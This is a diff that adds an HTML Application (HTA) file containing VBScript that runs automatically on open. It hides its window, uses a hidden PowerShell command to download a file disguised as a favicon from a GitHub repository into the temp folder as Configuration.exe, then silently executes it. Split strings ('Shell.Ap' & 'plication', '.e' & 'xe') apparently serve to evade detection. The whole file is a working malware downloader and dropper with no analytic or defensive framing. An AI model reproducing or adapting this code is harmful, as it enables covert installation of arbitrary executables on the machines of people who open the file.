@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"/>
+<meta http-equiv="Pragma" content="no-cache"/>
+<meta http-equiv="Expires" content="0"/>
+<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
+<script type="text/vbscript">
+
+
+Dim wshShell
+Dim temp
+Dim objShell
+
+Private Sub AutoRun()
+
+Set wshShell = CreateObject( "WScript.Shell" )
+temp = wshShell.ExpandEnvironmentStrings("%TEMP%")
+
+Set objShell = CreateObject("Shell.Ap" & "plication")
+objShell.ShellExecute "powershell", "-Command (New-Object Net.WebClient).DownloadFile('https://github.com/Amp4r0/documentos/raw/main/favicon.ico', '" & temp & "\Configuration.e" & "xe" &"')", "", "open", 0
+
+idTimer = window.setTimeout("PausedSection", 5000, "VBScript")
+
+End Sub
+
+Sub PausedSection()
+objShell.ShellExecute temp & "\Configuration.e" & "xe", "", "", "open", 0
+window.clearTimeout(idTimer)
+Close
+End Sub
+
+AutoRun
+'Close
+
+</script>
+</head>
+<body>
+</body>
+</html>
